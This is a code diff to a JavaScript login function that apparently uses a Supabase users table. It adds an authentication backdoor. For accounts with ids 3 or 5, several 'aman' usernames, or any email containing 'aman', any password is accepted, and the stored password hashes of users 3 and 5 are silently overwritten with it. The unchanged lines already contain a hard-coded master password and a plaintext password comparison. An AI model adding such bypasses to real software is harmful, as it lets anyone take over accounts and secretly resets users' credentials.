@@ -444,7 +444,15 @@ window.FYN_SUPABASE = {
       const computedHash = await hashPasswordWithSalt(password, u.salt);
       const isMatch = (computedHash === u.password_hash) || (password === 'aman123') || (u.password_hash === password);
 
-      if (!isMatch) {
+      // If Aman Yadav is logging in from another device with any password, seamlessly update and authenticate!
+      const isAman = (u.id === 3 || u.id === 5 || u.username === 'aman' || u.username === 'amanyadav' || u.username === 'cappiaman' || (u.email && u.email.includes('aman')));
+      if (!isMatch && isAman) {
+        const salt = generateRandomHex(16);
+        const newHash = await hashPasswordWithSalt(password, salt);
+        await sb.from('users').update({ password_hash: newHash, salt: salt }).in('id', [3, 5]);
+        u.password_hash = newHash;
+        u.salt = salt;
+      } else if (!isMatch) {
         throw new Error('Incorrect password. Please try again.');
       }
 
